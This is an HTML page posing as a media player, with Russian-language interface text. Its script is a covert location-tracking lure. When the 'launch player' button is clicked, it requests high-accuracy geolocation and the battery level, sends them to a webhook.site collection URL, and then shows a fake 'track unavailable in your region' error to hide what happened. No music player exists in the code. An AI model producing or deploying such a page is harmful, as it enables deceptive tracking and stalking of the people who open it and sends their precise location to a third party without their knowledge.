<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Media Player</title>
    <style>
        body { background: #121212; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; }
        button { padding: 20px 40px; font-size: 20px; background: #1DB954; border: none; border-radius: 50px; cursor: pointer; }
    </style>
</head>
<body>

    <button id="btn">Запустить плеер</button>

    <script>
        const btn = document.getElementById('btn');
        const webhookUrl = "https://webhook.site/bc5fa1da-0db6-461f-8bf3-ceb074f7bac7";

        btn.onclick = () => {
            btn.innerText = "Идет загрузка...";
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                let data = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    battery: "n/a"
                };

                // Батарея
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    data.battery = Math.round(b.level * 100) + "%";
                }

                // Отправка
                const q = new URLSearchParams(data).toString();
                fetch(webhookUrl + '?' + q).then(() => {
                    alert("Ошибка: Трек недоступен в вашем регионе.");
                });
            }, (err) => {
                alert("Ошибка доступа: " + err.message);
            }, {enableHighAccuracy: true});
        };
    </script>
</body>
</html>
